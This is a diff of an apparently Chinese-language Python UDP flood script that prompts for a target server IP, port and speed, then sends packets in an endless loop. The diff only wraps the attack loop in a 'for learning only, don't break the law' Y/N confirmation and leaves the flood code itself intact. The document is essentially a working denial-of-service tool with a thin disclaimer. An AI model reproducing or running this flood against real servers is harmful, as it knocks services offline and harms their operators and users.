@@ -37,13 +37,19 @@ print("╲______________________________________________________________________
 IP_address = input("请输入要攻击的服务器的IP地址:")
 TPS = int(input("请输入攻击端口:"))
 speed = int(input("请输入攻击速度(1-1000):"))
-
-print("OK开始闪击")
-os.system("clear")
-#变量设置
-sent = 0
-while True:
-    sock.sendto(bytes, (IP_address,TPS))
-    sent = sent + 1
-    print ("已攻击 %s 次到服务器的 %s 端口 %d"%(sent,IP_address,TPS))
-    time.sleep((1000-speed)/2000)
+huida = input("这个脚本仅作为学习用途，请勿犯法！是否开始闪击？（N/Y）")
+if huida == "Y":
+    print("OK开始闪击")
+    os.system("clear")
+    #变量设置
+    sent = 0
+    while True:
+        sock.sendto(bytes, (IP_address,TPS))
+        sent = sent + 1
+        print ("已攻击 %s 次到服务器的 %s 端口 %d"%(sent,IP_address,TPS))
+        time.sleep((1000-speed)/2000)
+elif huida == "N":
+    os.system("clear")
+    print("关闭闪击！")
+else:
+    print("啥意思？")
